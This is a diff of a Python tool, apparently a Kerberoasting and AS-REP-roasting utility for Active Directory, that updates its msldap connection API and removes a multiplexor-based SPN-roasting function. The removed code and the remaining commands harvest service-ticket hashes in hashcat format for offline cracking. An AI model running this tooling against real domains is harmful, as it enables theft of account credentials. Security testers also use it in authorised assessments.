@@ -6,12 +6,14 @@
 
 
 from msldap.ldap_objects.aduser import MSADUser, MSADUser_TSV_ATTRS
-from msldap.commons.url import MSLDAPURLDecoder
+from msldap.commons.factory import LDAPConnectionFactory
 from msldap import logger as msldaplogger
+
+from asyauth.protocols.kerberos.gssapi import KRB5_MECH_INDEP_TOKEN
 
 from minikerberos import logger as kerblogger
 from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
-from msldap.authentication.kerberos.gssapi import get_gssapi, GSSWrapToken, KRB5_MECH_INDEP_TOKEN
+
 from minikerberos.common.url import KerberosClientURL, kerberos_url_help_epilog
 from minikerberos.common.spn import KerberosSPN
 from minikerberos.common.creds import KerberosCredential
@@ -66,63 +68,6 @@ TGS (get a TGS for given SPN and store it in a CCACHE file):
 
 For more information on kerberos and LDAP connection string options please consult the README of minikerberos and msldap respectively
 """
-
-async def spnmultiplexor(args):
-	try:
-		from multiplexor.operator.external.sspi import KerberosSSPIClient
-		from multiplexor.operator import MultiplexorOperator
-	except ImportError as error:
-		print('Failed to import multiplexor module! You will need to install multiplexor to get this working!')
-
-	logger = logging.getLogger('websockets')
-	logger.setLevel(100)
-	if args.verbose > 2:
-		logger.setLevel(logging.INFO)
-
-	try:
-		logging.debug('[SPN-MP] input URL: %s' % args.mp_url)
-		url_e = urlparse(args.mp_url)
-		agentid = url_e.path.replace('/','')
-		logging.debug('[SPN-MP] agentid: %s' % agentid)
-
-		targets = get_targets_from_file(args)
-		targets += get_target_from_args(args)
-		if len(targets) == 0:
-			raise Exception('No targets were specified! Either use target file or specify target via cmdline')
-		
-		logging.debug('[SPN-MP] loaded %s targets' % len(targets))
-		operator = MultiplexorOperator(args.mp_url)
-		await operator.connect()
-		#creating virtual sspi server
-		results = []
-		for target in targets:
-			server_info = await operator.start_sspi(agentid)
-			#print(server_info)
-			sspi_url = 'ws://%s:%s' % (server_info['listen_ip'], server_info['listen_port'])
-			#print(sspi_url)
-			ksspi = KerberosSSPIClient(sspi_url)
-			await ksspi.connect()
-
-			apreq, err = await ksspi.authenticate(target.get_formatted_pname())
-			if err is not None:
-				logging.debug('[SPN-MP] error occurred while roasting %s: %s' % (target.get_formatted_pname(), err))
-				continue
-			unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(apreq)
-			aprep = AP_REQ.load(unwrap.data[2:]).native
-			results.append(TGSTicket2hashcat(aprep))
-
-		if args.out_file:
-			with open(args.out_file, 'w', newline = '') as f:
-				for thash in results:
-					f.write(thash + '\r\n')
-
-		else:
-			for thash in results:
-				print(thash)
-
-	except Exception as e:
-		logging.exception('[SPN-MP] exception!')
-
 def get_targets_from_file(args, to_spn = True):
 	targets = []
 	if args.targets:
@@ -197,7 +142,7 @@ async def run_auto():
 		logon = get_logon_info()
 		domain = logon['domain']
 		url = 'ldap+sspi-ntlm://%s' % logon['logonserver']
-		msldap_url = MSLDAPURLDecoder(url)
+		msldap_url = LDAPConnectionFactory.from_url(url)
 		client = msldap_url.get_client()
 		_, err = await client.connect()
 		if err is not None:
@@ -438,15 +383,11 @@ async def amain(args):
 
 		logging.info('SSPI based Kerberoast complete')
 
-	elif args.command == 'spnroast-multiplexor':
-		#hiding the import so it's not necessary to install multiplexor
-		await spnmultiplexor(args)
-
 	elif args.command == 'auto':
 		await run_auto()
 		
 	elif args.command == 'ldap':
-		ldap_url = MSLDAPURLDecoder(args.ldap_url)
+		ldap_url = LDAPConnectionFactory.from_url(args.ldap_url)
 		client = ldap_url.get_client()
 		_, err = await client.connect()
 		if err is not None:
@@ -568,7 +509,7 @@ def main():
 	subparsers.required = True
 	subparsers.dest = 'command'
 
-	ldap_group = subparsers.add_parser('ldap', formatter_class=argparse.RawDescriptionHelpFormatter, help='Enumerate potentially vulnerable users via LDAP', epilog = MSLDAPURLDecoder.help_epilog)
+	ldap_group = subparsers.add_parser('ldap', formatter_class=argparse.RawDescriptionHelpFormatter, help='Enumerate potentially vulnerable users via LDAP', epilog = LDAPConnectionFactory.help_epilog)
 	ldap_group.add_argument('type', choices=['spn', 'asrep', 'full','custom', 'all'], help='type of vulnerable users to enumerate')
 	ldap_group.add_argument('ldap_url',  help='LDAP connection URL')
 	ldap_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
